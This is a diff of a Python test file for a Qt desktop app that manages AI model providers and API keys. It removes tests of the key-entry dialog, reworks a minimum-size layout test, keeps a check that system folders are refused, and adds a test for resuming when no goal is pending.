         self.assertTrue(pump(self.verified(win), 10))
         by = {p.card.name: len(p.calls) for p in st.providers}
-        self.assertGreater(by["ollama/qwen"], 0)
-        self.assertEqual(by["claude/opus"] + by["claude/sonnet"] + by["claude/fable"], 0)   # Claude was never touched
+        self.assertGreater(by["ollama/qwen"], 0); self.assertEqual(by["claude/opus"] + by["claude/sonnet"] + by["claude/fable"], 0)
 
-    def test_adding_a_key_in_the_window_really_enables_the_provider(self):
-        """End to end with the REAL build_stack: before the dialog the tier is 'no API key', after it the provider exists.
-        (A first version stored the key under the wrong name and a name-matching assertion hid it.)"""
-        from praxis.config import build_stack
-        env = {k: "" for k in ("CEREBRAS_API_KEY", "GROQ_API_KEY", "GEMINI_API_KEY", "MISTRAL_API_KEY", "NVIDIA_API_KEY",
-                               "OPENROUTER_API_KEY", "OLLAMA_API_KEY")}
-        with mock.patch.dict(os.environ, {"PRAXIS_HOME": tempfile.mkdtemp(), **env}):
-            win, ctl, ws = self.make(factory=build_stack)
-            self.assertIn("cerebras", ctl.stack.skipped)
-            self.assertFalse(any(p.card.name.startswith("cerebras/") for p in ctl.stack.providers))
-            win.frugal_seg.changed.emit("frugal")
-            pre = ctl.stack
-
-            class FakeKey:
-                def __init__(self, parent, p): self.value = "csk_live_example_key_123456"
-                def exec(self): return 1
-            with mock.patch("praxis.desktop.qt.app.KeyDialog", FakeKey):
-                win.add_key(preset("cerebras"))
-            self.assertTrue(pump(lambda: ctl.state == "idle" and ctl.stack is not pre, 20), ctl.error)
-            self.assertNotIn("cerebras", ctl.stack.skipped)
-            self.assertTrue(any(p.card.name.startswith("cerebras/") for p in ctl.stack.providers))   # the key was FOUND
-            self.assertEqual(ctl.stack.router.strategy, "frugal")                                    # the choice survived the rebuild
-            win.show_page("Fuel")
-            self.assertEqual([b.text() for b in win.fuel.host.findChildren(QPushButton)].count("Add key..."),
-                             len([k for k, v in ctl.stack.skipped.items() if "no API key" in v]))   # cerebras no longer asks
-            keyfile = os.path.join(os.environ["PRAXIS_HOME"], "secrets.json")
-            if os.name == "posix":
-                self.assertEqual(os.stat(keyfile).st_mode & 0o777, 0o600)
-            self.assertNotIn("csk_live", win.mission.activity.toPlainText() + win.status.text())    # never echoed to the screen
-
-    def test_key_dialog_refuses_junk_and_explains_the_data_terms(self):
-        d = KeyDialog(None, preset("gemini"))
-        d.edit.setText("short"); d._save()
-        self.assertEqual(d.value, "")
-        texts = " ".join(l.text() for l in d.findChildren(type(d.findChildren(__import__("PySide6.QtWidgets", fromlist=["QLabel"]).QLabel)[0])))
-        self.assertIn("OPEN", texts)                                           # gemini's free tier may train: say so
-        d2 = KeyDialog(None, preset("groq"))
-        self.assertIn("TRUSTED", " ".join(l.text() for l in d2.findChildren(__import__("PySide6.QtWidgets", fromlist=["QLabel"]).QLabel)))
-        d2.edit.setText("gsk_abcdefghijkl"); d2._save()
-        self.assertEqual(d2.value, "gsk_abcdefghijkl")
-
-    # ---- layout ------------------------------------------------------------------------------------------------
-    def test_every_page_fits_at_the_minimum_window_size_and_the_hero_never_overlaps_the_graph(self):
+    # ---- layout and folders -------------------------------------------------------------------------------------------------------
+    def test_at_the_minimum_size_the_core_and_the_prompt_do_not_overlap(self):
         win, ctl, ws = self.make(stack=self.rich_stack())
-        win.resize(win.minimumWidth(), win.minimumHeight())
-        for name in ("Mission", "Timeline", "Fuel", "Models", "Memory", "System"):
-            win.show_page(name); pump(lambda: False, 0.1)
-            self.assertLessEqual(win.minimumSizeHint().height(), win.minimumHeight(), name)
-            self.assertLessEqual(win.minimumSizeHint().width(), win.minimumWidth(), name)
-        win.show_page("Mission"); pump(lambda: False, 0.1)
-        m = win.mission
-        self.assertLessEqual(m.core.geometry().bottom(), m.graph.geometry().top())
-        self.assertLessEqual(m.graph.geometry().bottom(), m.objective.parentWidget().geometry().top())
+        win.resize(win.minimumWidth(), win.minimumHeight()); pump(lambda: False, 0.2)
+        self.assertLessEqual(win.minimumSizeHint().height(), win.minimumHeight()); self.assertLessEqual(win.minimumSizeHint().width(), win.minimumWidth())
+        self.assertLessEqual(win.core.geometry().bottom(), win.prompt.parentWidget().geometry().top() + 1)
+        self.assertGreaterEqual(win.core.width(), 560); self.assertGreaterEqual(win.core.height(), 300)
 
     def test_switching_to_a_system_folder_is_refused(self):
         win, ctl, ws = self.make()
         with mock.patch("praxis.desktop.qt.app.QMessageBox.warning") as w:
             win._switch("/usr")
         self.assertTrue(w.called); self.assertEqual(ctl.workspace, os.path.realpath(ws))
+
+    def test_resume_with_nothing_to_resume_says_so(self):
+        win, ctl, ws = self.make()
+        win.resume_goal(); self.assertIn("Nothing to resume", win.core.caption)
 
 
 if __name__ == "__main__":
